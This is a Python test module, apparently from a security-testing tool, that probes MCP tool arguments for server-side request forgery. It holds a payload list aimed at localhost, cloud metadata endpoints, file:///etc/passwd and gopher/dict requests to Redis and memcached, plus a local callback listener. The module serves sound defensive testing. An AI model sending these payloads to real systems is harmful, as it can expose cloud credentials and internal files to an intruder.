"""Server-Side Request Forgery tests via MCP tools"""
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler


class SSRFTest:
    """Detect SSRF by injecting URLs pointing to controlled listener"""
    
    def __init__(self, pentester):
        self.pentester = pentester
        self.callback_received = False
        self.callback_data = None
        
    SSRF_PAYLOADS = [
        # Localhost probing
        "http://127.0.0.1:{port}/ssrf-test",
        "http://localhost:{port}/ssrf-test",
        "http://[::1]:{port}/ssrf-test",
        # Cloud metadata endpoints
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        # DNS rebinding / internal
        "http://0.0.0.0:{port}/ssrf-test",
        "http://localtest.me:{port}/ssrf-test",
        # Protocol smuggling
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stats",
        "gopher://127.0.0.1:6379/_INFO",
    ]
    
    def _start_listener(self, port):
        """Start HTTP listener to detect callbacks"""
        test = self
        
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                test.callback_received = True
                test.callback_data = {
                    'path': self.path,
                    'headers': dict(self.headers)
                }
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"SSRF-CONFIRMED")
            
            def log_message(self, *args):
                pass  # Suppress logging
        
        self.server = HTTPServer(('127.0.0.1', port), Handler)
        thread = threading.Thread(target=self.server.handle_request, daemon=True)
        thread.start()
        return thread
    
    def run(self, tool):
        """Test tool arguments for SSRF vulnerabilities"""
        self.pentester.health_check()
        findings = []
        port = 18273  # Random high port
        
        schema = tool.get('inputSchema', {})
        url_args = self._find_url_args(schema)
        
        for arg in url_args:
            for payload_template in self.SSRF_PAYLOADS:
                self.callback_received = False
                payload = payload_template.format(port=port) if '{port}' in payload_template else payload_template
                
                # Start listener for callback-based detection
                if '{port}' in payload_template:
                    try:
                        listener = self._start_listener(port)
                    except OSError as e:
                        print(f"[!] Failed to start SSRF listener: {e}")
                        continue
                
                try:
                    params = {"name": tool['name'], "arguments": {arg: payload}}
                    resp, _ = self.pentester.send("tools/call", params)
                    
                    # Check callback-based SSRF
                    if self.callback_received:
                        findings.append({
                            'type': 'SSRF_CALLBACK',
                            'tool': tool['name'],
                            'arg': arg,
                            'payload': payload,
                            'callback_data': self.callback_data,
                            'severity': 'CRITICAL'
                        })
                    
                    # Check response-based SSRF (cloud metadata)
                    content = str(resp)
                    if self._detect_ssrf_response(content, payload):
                        findings.append({
                            'type': 'SSRF_RESPONSE',
                            'tool': tool['name'],
                            'arg': arg,
                            'payload': payload,
                            'response_snippet': content[:500],
                            'severity': 'CRITICAL'
                        })
                except Exception as e:
                    print(f"[!] SSRF test error for {tool['name']}.{arg}: {e}")
                finally:
                    # Cleanup listener
                    if hasattr(self, 'server'):
                        try:
                            self.server.server_close()
                        except Exception:
                            pass
        
        return findings
    
    def _find_url_args(self, schema):
        """Identify arguments likely to accept URLs"""
        url_hints = ['url', 'uri', 'href', 'link', 'endpoint', 'host', 'target', 'source']
        args = []
        for prop, spec in schema.get('properties', {}).items():
            if any(hint in prop.lower() for hint in url_hints):
                args.append(prop)
            elif spec.get('format') == 'uri':
                args.append(prop)
        return args or list(schema.get('properties', {}).keys())  # Fallback: test all
    
    def _detect_ssrf_response(self, content, payload):
        """Detect SSRF via response content analysis"""
        indicators = [
            'ami-id', 'instance-id',  # AWS metadata
            'computeMetadata',        # GCP metadata
            'SSRF-CONFIRMED',         # Our canary
            'redis_version',          # Redis info
        ]
        return any(ind in content for ind in indicators)
